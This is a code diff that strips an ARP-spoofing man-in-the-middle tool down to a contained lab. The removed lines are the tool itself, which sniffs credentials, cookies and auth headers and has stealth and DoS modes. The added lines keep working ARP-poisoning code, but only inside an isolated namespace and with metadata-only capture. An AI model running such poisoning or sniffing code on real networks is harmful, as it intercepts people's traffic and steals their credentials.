-                    if "content-type" in headers:
-                        http_info["content_type"] = headers["content_type"]
-                    if "location" in headers:
-                        http_info["redirect"] = headers["location"]
-
-            except Exception:
-                pass
-        return http_info
-
-    def process_packet(self, packet):
-        """Callback for each intercepted packet."""
+    def process(self, packet):
         try:
-            ts = time.time()
-            pkt_len = len(packet)
-            classified = self._classify(packet)
-
+            meta = packet_metadata(packet)
             with self.lock:
-                self.packets_captured += 1
-                self.protocol[classified] += 1
-
-                #STATS.reclassify  += 1
-                self.bandwidth_window.append((ts, pkt_len))
-
-                # Bandwidth calc
-                cutoff = ts - 1.0
-                while self.bandwidth_window and self.bandwidth_window[0][0] < cutoff:
-                    self.bandwidth_window.popleft()
-                if self.bandwidth_window:
-                    window_bytes = sum(b for _, b in self.bandwidth_window)
-                    window_time = max(0.001, ts - self.bandwidth_window[0][0] if len(self.bandwidth_window) > 1 else 0.001)
-                    self.current_bps = window_bytes / window_time
-                    self.current_pps = len(self.bandwidth_window) / window_time
-
-            # PCAP buffer
-            if self.pcap_out:
-                self.pcap_buffer.append(packet)
-
-            # ─── Parse & display ───
-
-            # DNS
-            if packet.haslayer(DNS) and packet.haslayer(UDP):
-                dns = packet[DNS]
-                if dns.qr == 0 and dns.qd:
-                    q = dns.qd
-                    qname = str(q.qname.decode('utf-8', errors='replace')) if hasattr(q.qname, 'decode') else str(q.qname)
-                    entry = {"timestamp": datetime.now().isoformat(), "query": qname}
-                    self.dns_queries.append(entry)
-                    if not self.json_output:
-                        print(f"  {Color.blue('[DNS]')} {packet[IP].src} -> {packet[IP].dst}  |  {qname}")
-
-            # HTTP
-            if classified == "HTTP" and packet.haslayer(Raw):
-                http_info = self._extract_http(packet)
-                if http_info:
-                    ip = packet[IP]
-                    tcp = packet[TCP]
-                    htype = http_info.get("type", "?")
-                    if htype == "request":
-                        entry = {
-                            "timestamp": datetime.now().isoformat(),
-                            "src": ip.src, "dst": ip.dst,
-                            "sport": tcp.sport, "dport": tcp.dport,
-                            **http_info
-                        }
-                        self.http_requests.append(entry)
-                        if self.show_http and not self.json_output:
-                            req_line = http_info.get("request_line", "?")
-                            host = http_info.get("host", "")
-                            print(f"  {Color.cyan('[HTTP→]')} {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport}")
-                            print(f"          {req_line}")
-                            if host:
-                                print(f"          Host: {host}")
-                            if "cookie" in http_info:
-                                print(f"          {Color.yellow('Cookie:')} {http_info['cookie'][:100]}")
-                            if "authorization" in http_info:
-                                print(f"          {Color.red('Auth:')} {http_info['authorization']}")
-
-                    elif htype == "response":
-                        entry = {"timestamp": datetime.now().isoformat(), **http_info}
-                        self.http_responses.append(entry)
-                        if self.show_http and not self.json_output:
-                            print(f"  {Color.magenta('[HTTP←]')} {ip.dst}:{tcp.dport} <- {ip.src}:{tcp.sport}")
-                            print(f"          {http_info.get('status_line', '?')}")
-                            if "set_cookie" in http_info:
-                                print(f"          {Color.yellow('Set-Cookie:')} {http_info['set_cookie'][:100]}")
-                            if "redirect" in http_info:
-                                print(f"          {Color.yellow('Redirect:')} {http_info['redirect']}")
-
-            # Credential sniffing
-            if self.show_creds and packet.haslayer(Raw):
-                raw_data = packet[Raw].load
-                findings = analyze_payload(raw_data)
-                if findings:
-                    ip = packet[IP]
-                    tcp = packet[TCP] if packet.haslayer(TCP) else None
-                    for f in findings:
-                        entry = {
-                            "timestamp": datetime.now().isoformat(),
-                            "src_ip": ip.src, "dst_ip": ip.dst,
-                            "sport": tcp.sport if tcp else 0,
-                            "dport": tcp.dport if tcp else 0,
-                            **f
-                        }
-                        self.credentials_found.append(entry)
-                        if not self.json_output:
-                            sev = f['severity']
-                            pat = f['pattern']
-                            print(f"\n  {Color.red(f'[!] {sev}: {pat}')}")
-                            print(f"      {ip.src}:{tcp.sport if tcp else '?'} -> {ip.dst}:{tcp.dport if tcp else '?'}")
-                            print(f"      Context: {f['context'][:120]}")
-
-            # Connection tracking
-            if packet.haslayer(IP):
-                ip = packet[IP]
-                if packet.haslayer(TCP):
-                    tcp = packet[TCP]
-                    key = (ip.src, ip.dst, tcp.sport, tcp.dport)
-                elif packet.haslayer(UDP):
-                    udp = packet[UDP]
-                    key = (ip.src, ip.dst, udp.sport, udp.dport)
-                else:
-                    key = (ip.src, ip.dst, 0, 0)
-
-                with self.lock:
-                    c = self.connections[key]
-                    c["packets"] += 1
-                    c["bytes"] += pkt_len
-                    c["src"] = ip.src
-                    c["dst"] = ip.dst
-                    if packet.haslayer(TCP):
-                        c["sport"] = tcp.sport
-                        c["dport"] = tcp.dport
-                    elif packet.haslayer(UDP):
-                        c["sport"] = udp.sport
-                        c["dport"] = udp.dport
-
-            # JSON output per packet
-            if self.json_output:
-                info = {
-                    "timestamp": datetime.now().isoformat(),
-                    "length": pkt_len,
-                    "classification": classified,
-                }
-                if packet.haslayer(IP):
-                    info["src"] = packet[IP].src
-                    info["dst"] = packet[IP].dst
-                print(json.dumps(info))
-
-        except Exception as e:
-            if self.verbose:
-                print(Color.dim(f"  [!] Packet processing error: {e}"))
-
-    def get_stats(self):
-        """Return current statistics snapshot."""
-        elapsed = time.time() - self.start_time
-        return {
-            "elapsed_seconds": round(elapsed, 1),
-            "packets_captured": self.packets_captured,
-            "current_bps": round(self.current_bps, 1),
-            "current_pps": round(self.current_pps, 1),
-            "protocols": dict(self.protocol.most_common(10)),
-            "connections_tracked": len(self.connections),
-            "http_requests": len(self.http_requests),
-            "http_responses": len(self.http_responses),
-            "dns_queries": len(self.dns_queries),
-            "credentials_found": len(self.credentials_found),
-        }
-
-    def save_pcap(self, filename=None):
-        """Save captured packets to PCAP file."""
-        if not self.pcap_buffer:
-            print(Color.yellow("  [!] No packets to save"))
+                self.packets += 1
+                self.bytes += meta["bytes"]
+                self.protocols[meta["protocol"]] += 1
+                if "src" in meta:
+                    key = (meta["src"], meta["dst"], meta.get("sport", 0), meta.get("dport", 0), meta["protocol"])
+                    if key not in self.flows:
+                        self.flows[key] = {"packets": 0, "bytes": 0}
+                    self.flows[key]["packets"] += 1
+                    self.flows[key]["bytes"] += meta["bytes"]
+        except Exception:
+            # A malformed packet is ignored; its contents are never logged.
             return
-        fname = filename or self.pcap_out or f"mitm_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
-        try:
-            wrpcap(fname, self.pcap_buffer)
-            print(Color.green(f"  [✓] Saved {len(self.pcap_buffer)} packets to {fname}"))
-        except Exception as e:
-            print(Color.red(f"  [✗] PCAP save failed: {e}"))
 
-    def print_summary(self):
-        """Print full MITM session summary."""
-        elapsed = time.time() - self.start_time
-        print(f"\n{Color.bold('═══ MITM Session Summary ═══')}")
-        print(f"  Duration         : {elapsed:.1f}s")
-        print(f"  Packets captured : {self.packets_captured:,}")
-        print(f"  Avg BW           : {self._format_bps(self.packets_captured * 1500 / elapsed) if elapsed > 0 else 'N/A'}")
-        print(f"  Avg PPS          : {self.packets_captured / elapsed:.0f}" if elapsed > 0 else "")
-        print(f"  Connections seen : {len(self.connections)}")
-        print(f"  HTTP requests    : {len(self.http_requests)}")
-        print(f"  HTTP responses   : {len(self.http_responses)}")
-        print(f"  DNS queries      : {len(self.dns_queries)}")
-        print(f"  Credentials found: {len(self.credentials_found)}")
-        print(f"  Top protocols    :")
-        for proto, count in self.protocol.most_common(5):
-            print(f"    {proto:<15} {count:>8}")
-        print(f"  Top talkers      :")
-        talker_counts = Counter()
-        for k, v in self.connections.items():
-            talker_counts[v["src"]] += v["packets"]
-            talker_counts[v["dst"]] += v["packets"]
-        for ip_s, count in talker_counts.most_common(5):
-            print(f"    {ip_s:<20} {count:>8} packets")
-
-        if self.credentials_found:
-            print(f"\n  {Color.red('Credentials/Secrets Captured:')}")
-            for c in self.credentials_found[-10:]:  # last 10
-                print(f"    [{c['severity']}] {c['pattern']} | {c['src_ip']}:{c['sport']} -> {c['dst_ip']}:{c['dport']}")
-                print(f"           {c['context'][:100]}")
-
-        if self.http_requests:
-            print(f"\n  {Color.cyan('Recent HTTP Requests:')}")
-            for r in self.http_requests[-5:]:
-                print(f"    {r.get('request_line', '?')} | {r.get('host', '')}")
-
-        print(f"{'═' * 40}")
-
-    @staticmethod
-    def _format_bps(bps):
-        if bps > 1_000_000_000:
-            return f"{bps / 1_000_000_000:.1f} Gbps"
-        if bps > 1_000_000:
-            return f"{bps / 1_000_000:.1f} Mbps"
-        if bps > 1_000:
-            return f"{bps / 1_000:.1f} Kbps"
-        return f"{bps:.0f} bps"
+    def summary(self):
+        with self.lock:
+            flows = sorted(
+                self.flows.items(), key=lambda item: (item[1]["packets"], item[1]["bytes"]), reverse=True
+            )[:10]
+            return {
+                "packets": self.packets,
+                "bytes": self.bytes,
+                "protocols": dict(self.protocols.most_common()),
+                "top_flows": [
+                    {"src": key[0], "dst": key[1], "sport": key[2], "dport": key[3],
+                     "protocol": key[4], **stats}
+                    for key, stats in flows
+                ],
+                "payloads_decoded_or_saved": False,
+            }
 
 
-# ══════════════════════════════════════════════════════════════════════
-# STATISTICS DISPLAY THREAD
-# ══════════════════════════════════════════════════════════════════════
-class StatsDisplay:
-    """Background thread that prints live MITM statistics."""
-
-    def __init__(self, analyzer, interval=5.0):
-        self.analyzer = analyzer
-        self.interval = interval
-        self.running = True
-
-    def start(self):
-        def _loop():
-            while self.running:
-                time.sleep(self.interval)
-                if not self.running:
-                    break
-                stats = self.analyzer.get_stats()
-                print(f"\n{Color.bold('─── MITM Live Stats ───')}")
-                print(f"  Packets: {stats['packets_captured']:,}  |  "
-                      f"BW: {MITMAnalyzer._format_bps(stats['current_bps'])}  |  "
-                      f"PPS: {stats['current_pps']:.0f}")
-                print(f"  Connections: {stats['connections_tracked']}  |  "
-                      f"HTTP: {stats['http_requests']} req / {stats['http_responses']} res  |  "
-                      f"Creds: {Color.red(str(stats['credentials_found']))}")
-                protos = " | ".join(f"{p}({c})" for p, c in list(stats['protocols'].items())[:4])
-                if protos:
-                    print(f"  Protocols: {protos}")
-                print(f"{'─' * 45}")
-
-        t = threading.Thread(target=_loop, daemon=True)
-        t.start()
+def validate_worker_namespace(expected_inode):
+    if platform.system() != "Linux" or not hasattr(os, "geteuid") or os.geteuid() != 0:
+        raise RuntimeError("Invalid lab worker context.")
+    current_inode = os.stat("/proc/self/ns/net").st_ino
+    if current_inode != expected_inode:
+        raise RuntimeError("Lab worker is outside the namespace created by MIMic.")
+    links = json.loads(run_command([shutil.which("ip") or "ip", "-j", "link", "show"]).stdout)
+    if {item.get("ifname") for item in links} != {"lo", "eth0"}:
+        raise RuntimeError("Lab worker sees an unexpected interface set; refusing ARP traffic.")
+    routes = json.loads(run_command([shutil.which("ip") or "ip", "-j", "route", "show"]).stdout)
+    if any(route.get("dst") == "default" for route in routes):
+        raise RuntimeError("Lab worker sees an external route; refusing ARP traffic.")
+    addrs = json.loads(run_command([shutil.which("ip") or "ip", "-j", "addr", "show", "dev", "eth0"]).stdout)
+    actual = {
+        item.get("local") for link in addrs for item in link.get("addr_info", [])
+        if item.get("family") == "inet"
+    }
+    if actual != {"198.18.0.3"}:
+        raise RuntimeError("Lab worker address check failed; refusing ARP traffic.")
 
 
-# ══════════════════════════════════════════════════════════════════════
-# MAIN CLI
-# ══════════════════════════════════════════════════════════════════════
-def main():
-    parser = argparse.ArgumentParser(
-        description="ARP Spoofing / MITM Framework — For Authorized Penetration Testing",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  # Basic MITM between target and gateway:
-  python mitm.py -t 192.168.1.100 -g 192.168.1.1
-
-  # MITM with HTTP inspection and PCAP capture:
-  python mitm.py -t 192.168.1.100 -g 192.168.1.1 --show-http -o capture.pcap
-
-  # MITM on a specific interface:
-  python mitm.py -t 192.168.1.100 -g 192.168.1.1 -i "Wi-Fi"
-
-  # Stealth mode (no stats display, minimal output):
-  python mitm.py -t 192.168.1.100 -g 192.168.1.1 --quiet
-
-  # JSON output for tool integration:
-  python mitm.py -t 192.168.1.100 -g 192.168.1.1 -j
-
-  # Just resolve MACs and show targets without starting:
-  python mitm.py -t 192.168.1.100 -g 192.168.1.1 --dry-run
-
-Windows: Run as Administrator. Ensure Npcap is installed (WinPcap-compatible mode).
-        """
+def resolve_lab_mac(address):
+    answer, _ = srp(
+        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=address),
+        iface="eth0", timeout=2, retry=1, verbose=False,
     )
+    if not answer:
+        raise RuntimeError("Could not resolve lab host {}.".format(address))
+    return answer[0][1].hwsrc.lower()
 
-    parser.add_argument("-t", "--target", required=True, help="Target IP address (victim)")
-    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address (usually the router)")
-    parser.add_argument("-i", "--interface", help="Network interface to use")
-    parser.add_argument("--interval", type=float, default=2.0, help="ARP poison interval in seconds (default: 2.0)")
-    parser.add_argument("-o", "--output", help="Save intercepted traffic to PCAP file")
-    parser.add_argument("--show-http", action="store_true", help="Display HTTP requests/responses in real-time")
-    parser.add_argument("--no-creds", action="store_true", help="Disable credential sniffing")
-    parser.add_argument("--no-forward", action="store_true", help="Skip enabling IP forwarding (for DoS mode)")
-    parser.add_argument("--dry-run", action="store_true", help="Resolve MACs and show targets, then exit")
-    parser.add_argument("--quiet", action="store_true", help="Minimal output (no stats display)")
-    parser.add_argument("-j", "--json", action="store_true", help="JSON output mode")
-    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
-    parser.add_argument("--list-interfaces", action="store_true", help="List available interfaces and exit")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose packet processing output")
 
-    args = parser.parse_args()
+def lab_worker(expected_inode):
+    require_scapy()
+    validate_worker_namespace(expected_inode)
+    attacker_mac = get_if_hwaddr("eth0").lower()
+    target_mac = resolve_lab_mac(LAB_TARGET_IP)
+    gateway_mac = resolve_lab_mac(LAB_GATEWAY_IP)
 
-    Color._enabled = not args.no_color
+    stop_event = threading.Event()
+    for sig in (signal.SIGINT, signal.SIGTERM):
+        signal.signal(sig, lambda _sig, _frame: stop_event.set())
 
-    # ─── Banner ───
-    print(f"\n{Color.bold('╔═══════════════════════════════════════════════════╗')}")
-    print(f"{Color.bold('║     ARP Spoofing / MITM Framework — Pentest Ed.  ║')}")
-    print(f"{Color.bold('╚═══════════════════════════════════════════════════╝')}")
-    print(f"  Platform : {platform.system()} ({platform.release()})")
-    print(f"  Target   : {args.target}")
-    print(f"  Gateway  : {args.gateway}")
-    print(f"  Interface: {args.interface or 'default'}")
-    print()
-
-    # ─── Privilege check ───
-    if not is_admin():
-        print(Color.red("  [✗] Administrator/root privileges required."))
-        print(Color.yellow("      Run as Administrator (Windows) or sudo (Linux/macOS)."))
-        sys.exit(1)
-
-    # ─── List interfaces ───
-    if args.list_interfaces:
-        print(f"{Color.bold('Available Interfaces:')}")
-        if platform.system() == "Windows":
-            for iface in get_windows_if_list():
-                name = iface.get("name", "?")
-                desc = iface.get("description", "?")
-                ips = ", ".join(ip.get("addr", "") for ip in iface.get("ips", [])[:3])
-                print(f"  [{name}] {desc}  ({ips})")
-        else:
-            for i, name in enumerate(get_if_list()):
-                print(f"  [{i}] {name}")
-        return
-
-    # ─── Enable IP forwarding ───
-    if not args.no_forward:
-        enable_ip_forwarding()
-    else:
-        print(Color.yellow("  [!] IP forwarding DISABLED — target will lose connectivity"))
-        print(Color.yellow("      (This is a DoS attack, not a proper MITM)"))
-
-    # ─── Create ARP spoofer ───
-    spoofer = ARPSpoofer(
-        target_ip=args.target,
-        gateway_ip=args.gateway,
-        iface=args.interface,
-        interval=args.interval
+    metadata = LabMetadata()
+    capture_thread = threading.Thread(
+        target=lambda: _capture_loop(metadata, stop_event), daemon=True,
     )
+    capture_thread.start()
 
-    if args.dry_run:
-        print(Color.green("\n  [✓] Dry run complete. All MACs resolved."))
-        print(f"      Poison would tell {args.target} that {args.gateway} is at {spoofer.attacker_mac}")
-        print(f"      Poison would tell {args.gateway} that {args.target} is at {spoofer.attacker_mac}")
-        return
-
-    # ─── Create MITM analyzer ───
-    analyzer = MITMAnalyzer(
-        target_ip=args.target,
-        gateway_ip=args.gateway,
-        iface=args.interface,
-        pcap_out=args.output,
-        show_http=args.show_http,
-        show_creds=not args.no_creds,
-        json_output=args.json,
-        verbose=args.verbose
-    )
-
-    # ─── Stats display (if not quiet) ───
-    stats_display = None
-    if not args.quiet and not args.json:
-        stats_display = StatsDisplay(analyzer)
-        stats_display.start()
-
-    # ─── Start poisoning ───
-    spoofer.start_poisoning()
-
-    # ─── Signal handler for graceful shutdown ───
-    shutdown_event = threading.Event()
-
-    def signal_handler(sig, frame):
-        if shutdown_event.is_set():
-            print(Color.red("\n  [!!] Force exit"))
-            sys.exit(1)
-        print(Color.yellow("\n  [*] Caught Ctrl+C. Shutting down..."))
-        shutdown_event.set()
-
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-
-    # ─── Start packet capture (in the main thread for Scapy compat) ───
-    print(Color.green(f"\n  [*] MITM active! Intercepting traffic between {args.target} and {args.gateway}..."))
-    print(f"      Press Ctrl+C to stop and restore ARP tables\n")
-
-    try:
-        sniff(
-            iface=args.interface,
-            prn=analyzer.process_packet,
-            store=False,
-            stop_event=shutdown_event
+    def send_poison(destination_ip, destination_mac, claimed_ip):
+        packet = Ether(dst=destination_mac) / ARP(
+            op=2, pdst=destination_ip, hwdst=destination_mac,
+            psrc=claimed_ip, hwsrc=attacker_mac,
         )
-    except Exception as e:
-        print(Color.red(f"\n  [ERROR] Capture failed: {e}"))
-    finally:
-        # ─── Cleanup ───
-        if stats_display:
-            stats_display.running = False
+        sendp(packet, iface="eth0", verbose=False)
 
-        spoofer.stop_poisoning()
-        spoofer.restore_arp()
+    def restore():
+        for _ in range(4):
+            sendp(
+                Ether(dst=target_mac) / ARP(
+                    op=2, pdst=LAB_TARGET_IP, hwdst=target_mac,
+                    psrc=LAB_GATEWAY_IP, hwsrc=gateway_mac,
+                ), iface="eth0", verbose=False,
+            )
+            sendp(
+                Ether(dst=gateway_mac) / ARP(
+                    op=2, pdst=LAB_GATEWAY_IP, hwdst=gateway_mac,
+                    psrc=LAB_TARGET_IP, hwsrc=target_mac,
+                ), iface="eth0", verbose=False,
+            )
+            time.sleep(0.2)
 
-        if not args.no_forward:
-            disable_ip_forwarding()
-
-        # Save PCAP if requested
-        if args.output:
-            analyzer.save_pcap()
-
-        # Print summary
-        if not args.json:
-            analyzer.print_summary()
-        else:
-            print(json.dumps(analyzer.get_stats(), default=str, indent=2))
-
-        # Output credential findings in structured format
-        if analyzer.credentials_found and args.json:
-            print(json.dumps({"credentials_captured": analyzer.credentials_found}, default=str, indent=2))
-
-        print(Color.green("\n  [✓] ARP tables restored. Network back to normal."))
-        print(Color.dim("  [*] MITM session complete."))
-
-
-# ══════════════════════════════════════════════════════════════════════
-# ENTRY POINT
-# ══════════════════════════════════════════════════════════════════════
-if __name__ == "__main__":
+    poison_thread = None
     try:
-        main()
-    except KeyboardInterrupt:
-        print(Color.yellow("\n  [*] Interrupted. Exiting."))
-        sys.exit(0)
-    except Exception as e:
-        print(Color.red(f"\n  [ERROR] Unhandled exception: {e}"))
-        import traceback
-        traceback.print_exc()
-        sys.exit(1)
+        print("LAB_READY attacker={} target={} gateway={}".format(attacker_mac, target_mac, gateway_mac), flush=True)
+
+        def poison_loop():
+            while not stop_event.is_set():
+                send_poison(LAB_TARGET_IP, target_mac, LAB_GATEWAY_IP)
+                send_poison(LAB_GATEWAY_IP, gateway_mac, LAB_TARGET_IP)
+                stop_event.wait(1.0)
+
+        poison_thread = threading.Thread(target=poison_loop, daemon=True)
+        poison_thread.start()
+        while not stop_event.wait(0.25):
+            pass
+    finally:
+        stop_event.set()
+        if poison_thread:
+            poison_thread.join(timeout=2)
+        try:
+            restore()
+        except Exception:
+            pass
+        capture_thread.join(timeout=2)
+        print("LAB_SUMMARY " + json.dumps(metadata.summary(), sort_keys=True), flush=True)
+
+
+def _capture_loop(metadata, stop_event):
+    while not stop_event.is_set():
+        try:
+            sniff(iface="eth0", prn=metadata.process, store=False, timeout=0.5)
+        except Exception:
+            if not stop_event.is_set():
+                time.sleep(0.25)
+
+
+def run_lab():
+    require_scapy()
+    topology = LabTopology()
+    worker = None
+    previous_handlers = {}
+    interrupted = threading.Event()
+
+    def handle_signal(sig, _frame):
+        interrupted.set()
+        if worker and worker.poll() is None:
+            worker.terminate()
+
+    for sig in (signal.SIGINT, signal.SIGTERM):
+        previous_handlers[sig] = signal.signal(sig, handle_signal)
+
+    try:
+        topology.create()
+        print("MIMic isolated ARP lab")
+        print("  Topology: attacker, target, and gateway share one isolated L2 segment")
+        print("  Namespace addresses: attacker 198.18.0.3, target {}, gateway {}".format(
+            LAB_TARGET_IP, LAB_GATEWAY_IP,
+        ))
+        print("  The lab has no physical NICs, uplinks, or default routes.")
+        worker = topology.run_worker()
+        # Allow the first poison announcements to populate the two test ARP caches.
+        time.sleep(1.5)
+        if not interrupted.is_set():
+            topology.generate_test_traffic()
+            time.sleep(0.5)
+        if worker.poll() is None:
+            worker.terminate()
+            try:
+                worker.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                worker.kill()
+                worker.wait()
+        output = worker.stdout.read() if worker.stdout else ""
+        if output.strip():
+            for line in output.splitlines():
+                if line.startswith("LAB_SUMMARY "):
+                    print("  Metadata summary: " + line[len("LAB_SUMMARY "):])
+                else:
+                    print("  " + line)
+        if interrupted.is_set():
+            print("Lab interrupted; cleanup completed.")
+        else:
+            restored = topology.verify_arp_restored(
+                topology.worker_macs.get("target", ""),
+                topology.worker_macs.get("gateway", ""),
+            )
+            if restored:
+                print("Lab complete; ARP mappings were verified restored and the virtual network was removed.")
+            else:
+                print("Lab complete; the virtual network was removed, but ARP restoration could not be verified.")
+    finally:
+        if worker and worker.poll() is None:
+            worker.terminate()
+            try:
+                worker.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                worker.kill()
+                worker.wait()
+        topology.cleanup()
+        for sig, handler in previous_handlers.items():
+            signal.signal(sig, handler)
+
+
+def build_parser():
+    parser = argparse.ArgumentParser(
+        description="MIMic: local diagnostics, metadata-only PCAP analysis, and an isolated ARP lab.",
+        epilog=(
+            "Examples:\n"
+            "  python main.py --diagnose\n"
+            "  python main.py --analyze-pcap capture.pcap --json\n"
+            "  sudo python main.py --lab\n\n"
+            "Live ARP traffic is restricted to a disposable Linux namespace lab."
+        ),
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    modes = parser.add_mutually_exclusive_group(required=True)
+    modes.add_argument("--diagnose", action="store_true", help="Show local interface and route metadata.")
+    modes.add_argument("--analyze-pcap", metavar="FILE", help="Summarize a PCAP using packet metadata only.")
+    modes.add_argument("--lab", action="store_true", help="Run a contained Linux ARP demonstration in disposable namespaces.")
+    modes.add_argument("--_lab-worker", action="store_true", help=argparse.SUPPRESS)
+    parser.add_argument("--json", action="store_true", help="Print structured JSON output where applicable.")
+    parser.add_argument("--max-packets", type=int, default=1000000,
+                        help="Maximum packets to read from a PCAP (default: 1000000).")
+    # Private hand-off used only by --lab after topology creation.
+    parser.add_argument("--_expected-namespace", type=int, help=argparse.SUPPRESS)
+    return parser
+
+
+def main(argv=None):
+    parser = build_parser()
+    args = parser.parse_args(argv)
+    if args.max_packets < 1:
+        parser.error("--max-packets must be positive")
+    try:
+        if args._lab_worker:
+            if args._expected_namespace is None:
+                raise RuntimeError("Invalid private lab worker invocation.")
+            lab_worker(args._expected_namespace)
+        elif args.diagnose:
+            result = interface_diagnostics()
+            if args.json:
+                print(json.dumps(result, indent=2, sort_keys=True))
+            else:
+                print("MIMic local network diagnostics")
+                print("  Platform: {}".format(result["platform"]))
+                print("  Administrator/root: {}".format("yes" if result["administrator"] else "no"))
+                print("  Scapy: {}".format("available" if result["scapy_available"] else "unavailable"))
+                if result["scapy_error"]:
+                    print("  Scapy detail: {}".format(result["scapy_error"]))
+                print("  Interfaces:")
+                for item in result["interfaces"]:
+                    if "error" in item:
+                        print("    Error: {}".format(item["error"]))
+                    else:
+                        addresses = ", ".join(item.get("addresses", [])) or "no address found"
+                        print("    {} [{}]: {}".format(item.get("name", "?"), item.get("state", "unknown"), addresses))
+                route_text = json.dumps(result["default_route"]) if result["default_route"] else result["default_route_status"]
+                print("  Default route: {}".format(route_text))
+                for note in result.get("notes", []):
+                    print("  Note: {}".format(note))
+        elif args.analyze_pcap:
+            result = analyze_pcap(args.analyze_pcap, args.max_packets)
+            if args.json:
+                print(json.dumps(result, indent=2, sort_keys=True))
+            else:
+                print("MIMic PCAP metadata summary")
+                print("  File: {}".format(result["file"]))
+                print("  Packets: {:,} | Bytes: {:,}".format(result["packets"], result["bytes"]))
+                print("  Protocols:")
+                for name, count in result["protocols"].items():
+                    print("    {:<12} {:>8,}".format(name, count))
+                if result["dns_queries"]:
+                    print("  DNS queries:")
+                    for item in result["dns_queries"]:
+                        print("    {:>5}  {}".format(item["count"], item["name"]))
+                if result["top_flows"]:
+                    print("  Top flows:")
+                    for flow in result["top_flows"]:
+                        print("    {}:{} -> {}:{}  {} packets / {} bytes ({})".format(
+                            flow["src"], flow["sport"], flow["dst"], flow["dport"],
+                            flow["packets"], flow["bytes"], flow["protocol"],
+                        ))
+                print("  Payloads decoded or saved: no")
+        elif args.lab:
+            run_lab()
+    except (RuntimeError, OSError, ValueError, subprocess.SubprocessError) as exc:
+        print("MIMic: {}".format(exc), file=sys.stderr)
+        return 1
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
